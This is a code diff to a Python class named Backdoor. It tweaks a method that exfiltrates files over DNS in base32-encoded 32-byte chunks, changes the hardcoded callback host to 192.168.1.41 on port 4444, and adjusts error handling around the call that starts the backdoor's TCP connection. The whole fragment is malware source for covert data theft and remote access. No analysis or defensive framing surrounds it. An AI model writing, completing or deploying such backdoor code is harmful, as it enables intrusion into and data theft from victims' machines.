@@ -120,16 +120,16 @@ class Backdoor:
     def send_over_dns(self, data, filename):
         resp = []
         resp.append(base64.b32encode(f"#FILE# {filename}".encode()))
-        for i in range(0, len(data), 64):
-            if i+64 > len(data) - 1:
+        for i in range(0, len(data), 32):
+            if i+32 > len(data) - 1:
                 resp.append(data[i:len(data)])
                 break
-            resp.append(data[i:i+64])
+            resp.append(data[i:i+32])
         resp.append(base64.b32encode("#END#".encode()))
+        print(resp)
         for chunk in resp:
             encoded_chunk_str = str(chunk).strip("'b")
             self.dns_udp_handle(encoded_chunk_str)
-            print(encoded_chunk_str)
             time.sleep(1)
             
     
@@ -186,9 +186,10 @@ class Backdoor:
         '''
 
 try:
-    backdoor = Backdoor("10.136.66.98",
+    backdoor = Backdoor("192.168.1.41",
                         4444,
-                        "10.136.66.98")
+                        "192.168.1.41")
     backdoor.tcp_run()
-except:
+except Exception as e:
+    print(Exception, e)
     sys.exit(0)
